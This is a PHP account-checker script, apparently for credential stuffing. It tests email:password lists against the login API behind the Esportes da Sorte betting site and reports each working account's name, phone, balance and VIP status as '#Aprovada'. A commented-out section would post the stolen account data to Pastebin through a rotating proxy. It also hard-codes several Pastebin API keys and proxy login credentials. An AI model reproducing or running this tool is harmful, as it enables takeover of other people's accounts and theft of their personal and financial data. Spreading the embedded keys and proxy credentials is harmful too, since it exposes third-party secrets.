<?php



// ================================================================
// =     __  __ _____ _____ ____      _    _     _   _    _       =
// =    |  \/  | ____|_   _|  _ \    / \  | |   | | | |  / \      =
// =    | |\/| |  _|   | | | |_) |  / _ \ | |   | |_| | / _ \     =
// =    | |  | | |___  | | |  _ <  / ___ \| |___|  _  |/ ___ \    =
// =    |_|  |_|_____| |_| |_| \_\/_/   \_\_____|_| |_/_/   \_\   =
// =                                                              =
// =                                                              =
// =       ____ _   _ _____ ____ _  _______ ____  ____            =
// =      / ___| | | | ____/ ___| |/ / ____|  _ \/ ___|           =
// =     | |   | |_| |  _|| |   | ' /|  _| | |_) \___ \           =
// =     | |___|  _  | |__| |___| . \| |___|  _ < ___) |          =
// =      \____|_| |_|_____\____|_|\_\_____|_| \_\____/           =
// =                                                              =
// =                                                              =
// ================================================================


//strtoupper — Converte uma string para maiúsculas Ex: $teste = strtoupper(getStr($resposta, '',''));
// $variavel = (int)getStr2($pay, '',''); - (int) "Puchar valores inteiros da variavel"

$hoje = date("H:i:s - d/m/Y");

    
    error_reporting(0);
    
    function multiexplode($delimiters, $string) {
        $one = str_replace($delimiters, $delimiters[0], $string);
        $two = explode($delimiters[0], $one);
        return $two;
    }
    $lista = $_GET['lista'];
    $email = multiexplode(array(":", "|", ""), $lista)[0];
    $senha = multiexplode(array(":", "|", ""), $lista)[1];
    function metraiapuxar($string, $start, $end) {
        $str = explode($start, $string);
        $str = explode($end, $str[1]);
        return $str[0];
}
    function getStr($string,$start,$end){
    $str = explode($start,$string);
    $str = explode($end,$str[1]);
    return $str[0];
}
    function novoBypass($length = 16) {
    $characters = '66c4aacab43222d7';
    $charactersLength = strlen($characters);
    $randomString = '';
    for ($i = 0; $i < $length; $i++) {
        $randomString .= $characters[rand(0, $charactersLength - 1)];
    }
    return $randomString;
}



// ================ // =============//=================== C U R L  R E T O R N O  [ P A S T E B I N ] ============ // ================================//============
 // ================ // ====================//==========================//============================= // ================================//======================

//==$apis_keys = array("UKkmOlMexOLHR7AS4c5Y5ikJ_vLSbLMI", "NgrUUF7tj0bYijZcV-3U2uYp7umqZ5CQ", "ewBN6LJZaL1wHXSrRChwoh2mPIR0IWZD", "ALdNXqBwZ_P1pYE_VGPfn5E9T_LcPx2L", "aMKfBFNV500jXC08Pov68euV-sqwNYDy", "EoBLk76NENjhbM0cxksFn3vwikXehKcF");
//==$gerar_keys = $apis_keys[array_rand($apis_keys)];

//==$api_key_site = ''.$gerar_keys.'';
//==$texto_inserir = json_encode(array("Email" => $email, "Senha" => $senha, "Username" => $tesii, "Nome" => $nome, "Sobrenome" => $ult_nome, "Telefone" => $telefone, "CelularConfirmado" => $Tel_confirm, "SaldoBalanca" => $Saldo, "SaldoBruto" => $SaldoB, "ContaVIP" => $Vip_acc));
//==$pasta_privada = '0';
//==$nome_pasta = 'Return.php';
//==$tempo_expiracao = '10M';
//==$formato = 'php';
//==$api_user_key = ''; 


//==$nome_pasta = urlencode($nome_pasta);
//==$texto_inserir = urlencode($texto_inserir);

//==$site = 'https://pastebin.com/api/api_post.php';
//==$ch = curl_init($site);

//==curl_setopt($ch, CURLOPT_POST, true);
//==curl_setopt($ch, CURLOPT_POSTFIELDS, 'api_option=paste&api_user_key='.$api_user_key.'&api_paste_private='.$pasta_privada.'&api_paste_name='.$nome_pasta.'&api_paste_expire_date='.$tempo_expiracao.'&api_paste_format='.$formato.'&api_dev_key='.$api_key_site.'&api_paste_code='.$texto_inserir.'');
//==curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
//==curl_setopt($ch, CURLOPT_PROXY, "http://p.webshare.io:80");
//==curl_setopt($ch, CURLOPT_PROXYUSERPWD, "xotyjlsh-rotate:vzfrfocr2zg2");
//==curl_setopt($ch, CURLOPT_VERBOSE, 1);
//==curl_setopt($ch, CURLOPT_NOBODY, 0);
//==$pastebin = curl_exec($ch);

// ================ // =============//=================== C U R L  R E T O R N O  [ P A S T E B I N ] ============ // ================================//============
 // ================ // ====================//==========================//============================= // ================================//======================

//if (stripos($logar, '"user"')) {
 // $token1 = getStr($logar, 'sweeper_session=', ';');
 // $token2 = getStr($logar, 'bsid=', ';');
 // $token3 = getStr($logar, '"sweeper_uuid": "', '"'); /// CASO PRECISAR CODAR OU PUCHAR INFORMACOES DA CONTA LOGADA COM O COKIE ATIVO, ISTO PUCHA INFOS DO COKIEE DA SESSAO ATUAL DO USUARIO
 // $tokens = array(
 //   "Cookie: sweeper_session= $token1;",
 //   "bsid= $token2;"
 // );


$metraialinklogin = 'https://odin.sportingtech.com/api/user/login';
$metraia_postfield = '{"requestBody":{"username":null,"email":"'.$email.'","phone":null,"keepLoggedIn":null,"password":"'.$senha.'","loginType":3,"fingerPrint":"c1823d378f07386dc48948a24bc23bec"},"languageId":23,"device":"m"}';

// ================ // ====================//==========================//============================= // ================================//=================//

$ini = curl_init();
curl_setopt($ini, CURLOPT_URL, $metraialinklogin);
curl_setopt($ini, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($ini, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($ini, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
curl_setopt($ini, CURLOPT_COOKIEJAR, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_COOKIEFILE, getcwd(). "/cookies.txt");
curl_setopt($ini, CURLOPT_HTTPHEADER, array(

'Accept: application/json, text/plain, */*',
'Connection: keep-alive',
'Content-Type: application/json',
'finger_print: c1823d378f07386dc48948a24bc23bec',
'Host: odin.sportingtech.com',
'Origin: https://m.esportesdasorte.com',
'Referer: https://m.esportesdasorte.com/',
'Sec-Fetch-Dest: empty',
'Sec-Fetch-Mode: cors',
'Sec-Fetch-Site: cross-site',
'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/104.0.5112.102 Safari/537.36 OPR/90.0.4480.84'

));
curl_setopt($ini, CURLOPT_POSTFIELDS, $metraia_postfield);
//$referer = curl_getinfo($ini, CURLINFO_EFFECTIVE_URL);
 echo $resposta = curl_exec($ini);
//$jaison = json_decode(curl_exec($ini), true);

$json = json_decode($resposta, true);


$responsa_fi = $json['responseCodes'][0];
$retorno = $responsa_fi['responseMessage'];
$retorno_key = $responsa_fi['responseKey'];


// ================ // ====================//==========================//============================= // ================================//=================//

$user = metraiapuxar($resposta, '"username":"','"');
$nome = metraiapuxar($resposta, '"firstName":"','"');
$ult_nome = metraiapuxar($resposta, '"surname":"','"');

$telefone = (int)metraiapuxar($resposta, '"phone":"','"');
$confirmacao_tel = metraiapuxar($resposta, '"phoneConfirmed":',',');

$verificar_saldo = (int)metraiapuxar($resposta, '"balance":',',');
$saldo_bruto = (int)metraiapuxar($resposta, '"grossBalance":',',');

$verificar_vip_account = metraiapuxar($resposta, '"isVip":','}}');


if($verificar_saldo < 1){

    $Saldo = "Sem saldo";

} else {

    $Saldo = "Há saldo disponivel: $verificar_saldo ";

}

if($saldo_bruto < 1){

    $SaldoB = "Sem saldo";

} else {

    $SaldoB = "Com saldo, total: $saldo_bruto ";

}

if($confirmacao_tel == 'false'){

    $Tel_confirm = "Não confirmado.";

} else {

    $Tel_confirm = "Telefone confirmado: $telefone";

}

if($verificar_vip_account == 'false'){

    $Vip_acc = "Não há vip ativo";

} else {

    $Vip_acc = "Esta conta possui vip ativo, modo: $verificar_vip_account ";

}

// ================ // ====================//==========================//============================= // ================================//=================//
         

if (stripos($resposta, '"success":true')) {

echo "<span class='badge badge-success'>#Aprovada</span> $email|$senha  <span class='badge badge-info'>RETORNO:</span> $retorno_key <span class='badge badge-info'>USERNAME:</span> $user  <span class='badge badge-info'>NOME:</span> $nome $ult_nome  <span class='badge badge-info'>TELEFONES:</span> $telefone  <span class='badge badge-info'>SALDO (BALANCA):</span> $Saldo  <span class='badge badge-info'>SALDO (BRUTO):</span> $SaldoB  <span class='badge badge-info'>CONFIRM-TEL:</span> $Tel_confirm  <span class='badge badge-info'>VIP:</span> $Vip_acc <br>";

}else {

    echo "<span class='badge badge-danger'>#Reprovada</span> $email|$senha <span class='badge badge-info'>Retorno:</span> $retorno - $retorno_key<br>";
}
?>